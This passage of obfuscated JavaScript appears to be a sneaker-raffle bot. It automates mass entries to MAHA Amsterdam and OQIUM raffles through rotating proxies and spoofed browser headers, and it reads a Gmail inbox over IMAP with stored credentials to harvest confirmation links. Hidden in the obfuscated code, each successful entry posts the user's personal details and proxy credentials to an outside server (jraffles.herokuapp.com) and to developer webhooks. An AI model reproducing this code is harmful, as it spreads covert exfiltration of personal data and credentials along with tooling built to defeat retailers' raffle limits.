                            let _0x47663b = _0x54e191[_0x13d2ac]['Size']['replace']('.5', '\x201/2');
                            if (_0x47663b['toUpperCase']() == 'RANDOM') {
                                const _0x37d41d = await _0x2ced0a['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x4701e2 = Math['round'](Math['random']() * (_0x37d41d['length'] - 0x1));
                                await _0x37d41d[_0x4701e2]['click']();
                            } else
                                await _0x2ced0a['click']('button[aria-label=\x22' + _0x47663b + '\x22]');
                            await _0x497396(0x1f4);
                            try {
                                await _0x2ced0a['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x497396(0x12c), console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Filling\x20Information'), await _0x2ced0a['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_firstName', _0x54e191[_0x13d2ac]['FirstName']), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_lastName', _0x54e191[_0x13d2ac]['LastName']), await _0x497396(0x12c), await _0x2ced0a['select']('#dwfrm_raffle_addressFields_country', _0x54e191[_0x13d2ac]['Country']), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_city', _0x54e191[_0x13d2ac]['City']), await _0x497396(0x12c);
                            _0x54e191[_0x13d2ac]['Postcode'] == undefined && (_0x54e191[_0x13d2ac]['Postcode'] = _0x54e191[_0x13d2ac]['Zip']);
                            await _0x2ced0a['type']('#dwfrm_raffle_addressFields_postalCode', _0x54e191[_0x13d2ac]['Postcode']), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_address1', _0x54e191[_0x13d2ac]['Address1']), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_address2', _0x54e191[_0x13d2ac]['HouseNumber']), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x54e191[_0x13d2ac]['Address2']), await _0x497396(0x12c), await _0x2ced0a['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x497396(0x12c), await _0x2ced0a['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x54e191[_0x13d2ac]['Follower']), await _0x497396(0x1f4), await _0x2ced0a['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20' + _0xc3fc3['blue']('Awaiting\x20Paypal\x20Payment')), await _0x2ced0a['click']('.b-paypal_button');
                            try {
                                await _0x2ced0a['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x12e30c = 'no', _0xf67db6(_0x54e191[_0x13d2ac], _0x16594f), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x24a067['succesDEVMSG']);
                                await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x24a067['succesDEVMSG']), await _0x497396(0xc8), await _0x468b99(_0x196877, _0x24a067['succesPUBMSG']);
                                let _0x50a5f9 = _0x54e191[_0x13d2ac];
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'module': _0x16594f['name'],
                                        'entrydata': JSON['stringify'](_0x50a5f9),
                                        'proxy': '' + _0x12beb5[_0x13d2ac]
                                    };
                                    var _0x2185f0 = JSON['stringify'](prxdata);
                                    let _0x4f8168 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x2185f0, _0x4f8168);
                                } catch (_0x1ec2b7) {
                                }
                            } catch (_0x230055) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x230055)), _0x52bbd8 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x230055;
                                var _0x51f43c = await _0x232baa(_0x54e191[_0x13d2ac], _0x16594f, 'dev', !![], _0x52bbd8);
                                _0x24a067['errorDEV'] = { 'embeds': [_0x51f43c] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x24a067['errorDEV']), await _0x468b99(_0x432bcc, _0x24a067['errorDEV']);
                            }
                        } catch (_0x1cfc17) {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20' + _0x1cfc17)), _0x52bbd8 = '' + _0x1cfc17;
                            var _0x51f43c = await _0x232baa(_0x54e191[_0x13d2ac], _0x16594f, 'dev', !![], _0x52bbd8);
                            _0x24a067['errorDEV'] = { 'embeds': [_0x51f43c] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x24a067['errorDEV']), await _0x468b99(_0x432bcc, _0x24a067['errorDEV']), _0x12e30c = 'yes';
                        } finally {
                            _0x1b8be6 && _0x1b8be6['close']();
                            if (_0x12e30c == 'yes' && _0x254f44 != 0x5) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x16594f['name'] + ']\x20Task\x20' + (_0x13d2ac + 0x1) + '\x20:\x20Retrying\x20(' + _0x254f44 + '\x20/\x205)')), _0x13d2ac = _0x13d2ac - 0x1, _0x254f44 = _0x254f44 + 0x1;
                                continue;
                            }
                            _0x12e30c == 'yes' && _0x254f44 >= 0x5 && (_0x554010(_0x54e191[_0x13d2ac], _0x16594f), _0x12e30c = 'no', _0x254f44 = 0x0), console['log']('Waiting\x20for\x20' + _0x138f58['AfewDelay'] + '\x20ms'), await _0x497396(_0x138f58['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5c42a6, _0x11e399, _0x2912fd) {
                    for (var _0x3cbcfa = 0x0; _0x3cbcfa < _0x11e399['length']; _0x3cbcfa++) {
                        try {
                            await _0x494c97(_0x11e399, _0x3cbcfa);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x3be3f6(_0x4786b7, _0x191ef3, _0x367304, _0x59bd04, _0x53c074) {
                            var _0x57b9c8, _0x33195a = {}, _0x446f73 = [], _0x3f9111 = {}, _0x481f9c = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x4c5cd2 = Math['round'](Math['random']() * (_0x481f9c['length'] - 0x1));
                            !_0x59bd04 && (_0x59bd04 = {});
                            if (_0x191ef3 != 'ver') {
                                _0x38ef83(_0x367304['name'] + '\x20Task\x20' + (_0x4786b7 + 0x1) + '\x20/\x20' + _0x59bd04['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b), await _0x494c97(_0x59bd04, _0x4786b7), _0x33195a = _0x367304['data'], _0x33195a['data']['attributes']['email'] = '' + _0x59bd04[_0x4786b7]['Email'];
                                if (_0x59bd04[_0x4786b7]['Size'] == 'RANDOM') {
                                }
                                _0x33195a['data']['attributes']['properties']['$first_name'] = '' + _0x59bd04[_0x4786b7]['FirstName'], _0x33195a['data']['attributes']['properties']['$last_name'] = '' + _0x59bd04[_0x4786b7]['LastName'], _0x33195a['data']['attributes']['properties']['$address1'] = _0x59bd04[_0x4786b7]['Address1'] + '\x20' + _0x59bd04[_0x4786b7]['Address2'] + '\x20' + _0x59bd04[_0x4786b7]['HouseNumber'], _0x33195a['data']['attributes']['properties']['$zip'] = '' + _0x59bd04[_0x4786b7]['Zip'], _0x33195a['data']['attributes']['properties']['$city'] = '' + _0x59bd04[_0x4786b7]['City'], _0x33195a['data']['attributes']['properties']['$country'] = '' + _0x59bd04[_0x4786b7]['Country'], _0x59bd04[_0x4786b7]['Size'] == 'RANDOM' ? _0x33195a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x481f9c[_0x4c5cd2] : _0x33195a['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x59bd04[_0x4786b7]['Size'], _0x33195a['data']['attributes']['properties']['$phone_number'] = '' + _0x59bd04[_0x4786b7]['Phone'], _0x33195a['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x59bd04[_0x4786b7]['Follower'];
                            }
                            if (_0x138f58['useRandomProxy'] = ![])
                                var _0x448db3 = _0x53c074[_0x4786b7]['split'](':');
                            else
                                var _0x549186 = Math['round'](Math['random']() * (_0x53c074['length'] - 0x1)), _0x448db3 = _0x53c074[_0x549186]['split'](':');
                            var _0x3b10d3 = {
                                'jar': _0x5ed650,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x367304['url'],
                                'headers': _0x367304['headers'],
                                'body': JSON['stringify'](_0x33195a),
                                'proxy': 'http://' + _0x448db3[0x2] + ':' + _0x448db3[0x3] + '@' + _0x448db3[0x0] + ':' + _0x448db3[0x1]
                            };
                            return _0x191ef3 != 'ver' && (_0x3b10d3['url'] = _0x367304['url'], _0x3b10d3['headers'] = _0x367304['headers']), _0x191ef3 == 'ver' && (_0x3b10d3['method'] = 'GET'), new Promise(function (_0x1a8992, _0x5962f3) {
                                callback = async (_0x7f3eda, _0x40773f, _0x4eda9d) => {
                                    if (!_0x7f3eda && _0x40773f['statusCode'] == 0xca || !_0x7f3eda && _0x40773f['statusCode'] == 0xc8) {
                                        if (_0x191ef3 != 'ver') {
                                            var _0x160473 = await _0x232baa(_0x59bd04[_0x4786b7], _0x367304, 'dev', ![]), _0x3d1f80 = await _0x232baa(_0x59bd04[_0x4786b7], _0x367304, 'pub', ![]);
                                            const _0x366a63 = {
                                                'succesDEVMSG': { 'embeds': [_0x160473] },
                                                'succesPUBMSG': { 'embeds': [_0x3d1f80] }
                                            };
                                            let _0x2ead73 = _0x59bd04[_0x4786b7];
                                            try {
                                                prxdata = {
                                                    'username': _0x9f5859['replace']('#', ''),
                                                    'module': _0x367304['name'],
                                                    'entrydata': JSON['stringify'](_0x2ead73),
                                                    'proxy': '' + _0x53c074[_0x4786b7]
                                                };
                                                var _0x3a03be = JSON['stringify'](prxdata);
                                                let _0x163d76 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x3a03be, _0x163d76);
                                            } catch (_0x309986) {
                                            }
                                            if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                                                try {
                                                    await _0x468b99(_0x138f58['webhook'], _0x366a63['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x366a63['succesDEVMSG']), await _0x497396(0xc8);
                                            try {
                                                await _0x468b99(_0x196877, _0x366a63['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0xf67db6(_0x59bd04[_0x4786b7], _0x367304);
                                        }
                                        _0x1a8992(console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x367304['name'] + ']\x20Task\x20' + (_0x4786b7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x191ef3 != 'ver') {
                                            var _0x302efe = '' + _0x7f3eda, _0x3fb889 = await _0x232baa(_0x59bd04[_0x4786b7], _0x367304, 'dev', !![], _0x302efe), _0x4c84f4 = {};
                                            _0x4c84f4['errorDEV'] = { 'embeds': [_0x3fb889] }, _0x554010(_0x59bd04[_0x4786b7], _0x367304), _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x4c84f4['errorDEV']), await _0x468b99(_0x432bcc, _0x4c84f4['errorDEV']);
                                        }
                                        _0x5962f3(console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x367304['name'] + ']\x20Task\x20' + (_0x4786b7 + 0x1) + ':\x20' + _0x7f3eda)));
                                    }
                                };
                                try {
                                    _0x191ef3 != 'ver' && console['log'](_0x5d34e1() + '\x20[' + _0x367304['name'] + ']\x20Task\x20' + (_0x4786b7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x33195a['data']['attributes']['email']), _0x158f3c(_0x3b10d3, callback);
                                } catch (_0x3455e6) {
                                    console['log'](_0x5d34e1() + '\x20Task\x20' + (_0x4786b7 + 0x1) + ':\x20' + _0x3455e6);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x3be3f6(_0x3cbcfa, 'nor', _0x5c42a6, _0x11e399, _0x2912fd), console['log'](_0x5d34e1() + '\x20[' + _0x5c42a6['name'] + ']\x20Sleeping\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                        } catch (_0x5e9019) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5283de, _0x9093b5, _0x122bcc) {
                    var _0x1de8ff = [], _0x23e507 = ![];
                    async function _0xfe74a() {
                        var _0x58f022 = new _0x51270e({
                            'user': _0x138f58['masterMail'],
                            'password': _0x138f58['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5d6d67(_0x52fc64) {
                            _0x58f022['openBox']('INBOX', ![], _0x52fc64);
                        }
                        _0x58f022['once']('ready', function () {
                            _0x5d6d67(function (_0x657d24, _0x344b19) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x657d24)
                                    throw _0x657d24;
                                _0x58f022['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x4c6ba0, _0x4162e8) {
                                    if (!_0x4162e8 || !_0x4162e8['length'])
                                        console['log'](_0x5d34e1() + '\x20[' + _0x5283de['name'] + ']\x20No\x20mails\x20found'), _0x58f022['end']();
                                    else {
                                        var _0x591fce = _0x58f022['seq']['fetch'](_0x4162e8, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x591fce['on']('message', function (_0x47d360, _0x8d5ed8) {
                                            var _0x169c63 = '(#' + _0x8d5ed8 + ')\x20';
                                            _0x47d360['on']('body', function (_0x329d35, _0x26e424) {
                                                _0x3bc712(_0x329d35, (_0x19e51d, _0x1abbee) => {
                                                    var _0x184d64 = _0x1abbee['text']['split']('(')[0x1], _0x50c022 = _0x184d64['split'](')')[0x0];
                                                    _0x1de8ff['push'](_0x50c022);
                                                });
                                            }), _0x47d360['once']('end', function () {
                                            });
                                        }), _0x591fce['once']('error', function (_0x2be460) {
                                            console['log']('Fetch\x20error:\x20' + _0x2be460), _0x23e507 = !![];
                                        }), _0x591fce['once']('end', function () {
                                            _0x58f022['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x58f022['once']('error', function (_0x205cd1) {
                            console['log'](_0xc3fc3['red'](_0x205cd1['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x23e507 = !![];
                        }), _0x58f022['once']('end', async function () {
                            _0x23e507 = !![];
                        }), _0x58f022['connect']();
                    }
                    async function _0x159b21(_0x16e746, _0x5b9fcb, _0x4687ba) {
                        for (var _0x555b0c = 0x0; _0x555b0c < _0x5b9fcb['length']; _0x555b0c++) {
                            async function _0x590521(_0x52905e, _0x3dee53, _0x47ac4c, _0x13c2c8, _0x20e3f0) {
                                var _0x3aa6aa, _0x344146 = {}, _0x143856 = [], _0x3acadb = {}, _0x5b22a0 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1ab24f = Math['round'](Math['random']() * (_0x5b22a0['length'] - 0x1));
                                _0x13c2c8[_0x52905e]['Size'] == 'RANDOM' && (_0x13c2c8[_0x52905e]['Size'] = _0x5b22a0[_0x1ab24f]);
                                !_0x13c2c8 && (_0x13c2c8 = {});
                                if (_0x138f58['useRandomProxy'] = ![])
                                    var _0x2470d3 = _0x20e3f0[_0x52905e]['split'](':');
                                else
                                    var _0x205deb = Math['round'](Math['random']() * (_0x20e3f0['length'] - 0x1)), _0x2470d3 = _0x20e3f0[_0x205deb]['split'](':');
                                var _0x5916b6 = {
                                    'jar': _0x5ed650,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x47ac4c['url'],
                                    'headers': _0x47ac4c['headers'],
                                    'body': JSON['stringify'](_0x344146),
                                    'proxy': 'http://' + _0x2470d3[0x2] + ':' + _0x2470d3[0x3] + '@' + _0x2470d3[0x0] + ':' + _0x2470d3[0x1]
                                };
                                return _0x3dee53 != 'ver' && (_0x5916b6['url'] = _0x47ac4c['url'], _0x5916b6['headers'] = _0x47ac4c['headers']), _0x3dee53 == 'ver' && (_0x5916b6['method'] = 'GET', _0x5916b6['url'] = _0x13c2c8[_0x52905e]), new Promise(function (_0x77a048, _0x3555e2) {
                                    callback = async (_0x310d5c, _0x42c457, _0x8dca5d) => {
                                        if (!_0x310d5c && _0x42c457['statusCode'] == 0xca || !_0x310d5c && _0x42c457['statusCode'] == 0xc8) {
                                            if (_0x3dee53 != 'ver') {
                                                var _0x2db75c = await _0x232baa(_0x13c2c8[_0x52905e], _0x47ac4c, 'dev', ![]), _0xa5b917 = await _0x232baa(_0x13c2c8[_0x52905e], _0x47ac4c, 'pub', ![]);
                                                const _0x1e3e13 = {
                                                    'succesDEVMSG': { 'embeds': [_0x2db75c] },
                                                    'succesPUBMSG': { 'embeds': [_0xa5b917] }
                                                };
                                                if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                                                    try {
                                                        await _0x468b99(_0x138f58['webhook'], _0x1e3e13['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x1e3e13['succesDEVMSG']), await _0x497396(0xc8);
                                                try {
                                                    await _0x468b99(_0x196877, _0x1e3e13['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0xf67db6(_0x13c2c8[_0x52905e], _0x47ac4c);
                                            }
                                            _0x77a048(console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x47ac4c['name'] + ']\x20Task\x20' + (_0x52905e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3dee53 != 'ver') {
                                                var _0x371219 = '' + _0x310d5c, _0x1249e8 = await _0x232baa(_0x13c2c8[_0x52905e], _0x47ac4c, 'dev', !![], _0x371219), _0x39e22f = {};
                                                _0x39e22f['errorDEV'] = { 'embeds': [_0x1249e8] }, _0x554010(_0x13c2c8[_0x52905e], _0x47ac4c), _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x39e22f['errorDEV']), await _0x468b99(_0x432bcc, _0x39e22f['errorDEV']);
                                            }
                                            _0x3555e2(console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x47ac4c['name'] + ']\x20Task\x20' + (_0x52905e + 0x1) + ':\x20' + _0x310d5c)));
                                        }
                                    };
                                    try {
                                        _0x3dee53 != 'ver' ? console['log'](_0x5d34e1() + '\x20[' + _0x47ac4c['name'] + ']\x20Task\x20' + (_0x52905e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x344146['data']['attributes']['email']) : console['log'](_0x5d34e1() + '\x20[' + _0x47ac4c['name'] + ']\x20Task\x20' + (_0x52905e + 0x1) + ':\x20Fetching\x20Response'), _0x158f3c(_0x5916b6, callback);
                                    } catch (_0x435379) {
                                        console['log'](_0x5d34e1() + '\x20Task\x20' + (_0x52905e + 0x1) + ':\x20' + _0x435379);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x590521(_0x555b0c, 'ver', _0x16e746, _0x5b9fcb, _0x4687ba), console['log'](_0x5d34e1() + '\x20[' + _0x16e746['name'] + ']\x20Sleeping\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                            } catch (_0x38b670) {
                            }
                        }
                    }
                    try {
                        _0xfe74a();
                        while (!_0x23e507) {
                            await _0x497396(0xbb8);
                        }
                        console['log']('Found\x20' + _0x1de8ff['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x497396(0x9c4);
                    }
                    await _0x159b21(_0x5283de, _0x1de8ff, _0x122bcc);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x1c2e9d, _0x6dffbc, _0x4e21fc) {
                    var _0x5d0749 = _0x6dffbc, _0x5ef014 = 0x0;
                    for (var _0x2182a5 = 0x0; _0x2182a5 < _0x6dffbc['length']; _0x2182a5++) {
                        maxTasks = _0x138f58['threads'];
                        while (_0x5ef014 >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        async function _0x2b3dfb(_0x26f0d0, _0x541083, _0xb94695, _0x10af94) {
                            try {
                                await _0x494c97(_0x541083, _0x10af94);
                            } catch (_0x2531fd) {
                                throw new Error(_0x2531fd);
                            }
                            async function _0x11b14e(_0x255822, _0x3b7c9d, _0x5ebd4f, _0x452421, _0x9cb6f3) {
                                _0x5ef014++;
                                var _0x59ce0b, _0x4a58d4 = {}, _0x263a59 = [], _0x49f9d2 = {}, _0x124757 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2aa54b = Math['round'](Math['random']() * (_0x124757['length'] - 0x1));
                                !_0x452421 && (_0x452421 = {});
                                if (_0x3b7c9d != 'ver') {
                                    _0x38ef83(_0x5ebd4f['name'] + '\x20Task\x20' + (_0x255822 + 0x1) + '\x20/\x20' + _0x452421['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b), _0x263a59 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x9f5859
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x452421[_0x255822]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x138f58['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x30d211
                                            }
                                        ]
                                    }], _0x49f9d2 = { 'embeds': _0x263a59 }, _0x4a58d4 = _0x5ebd4f['data'], _0x4a58d4['data']['attributes']['email'] = '' + _0x452421[_0x255822]['Email'];
                                    if (_0x452421[_0x255822]['Size'] == 'RANDOM') {
                                    }
